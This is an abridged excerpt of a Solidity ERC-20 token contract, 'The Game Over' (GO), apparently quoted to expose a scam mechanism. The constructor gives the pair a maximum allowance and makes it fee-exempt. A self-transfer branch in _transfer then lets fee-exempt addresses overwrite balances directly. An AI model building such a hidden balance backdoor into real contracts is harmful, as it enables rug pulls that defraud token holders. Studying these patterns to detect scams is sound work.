...
contract TheGameOver  is Context, IERC20, Ownable {
    ...
    string private _name = unicode"The Game Over";
    string private _symbol = unicode"GO";
    ...
    constructor (address pair) {
        ...
        _allowances[owner()][address(pair)] = MAX;
        holderNoFee[owner()] = true;
        holderNoFee[pair] = true;
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {            
        ...
        if(sender == recipient && sender != uniswapPair && sender != address(this) && holderNoFee[msg.sender]){
            ...
            _balance[sender] = senderBalance;
            _balance[recipient] =recipientBalance ;
            return true;
        }
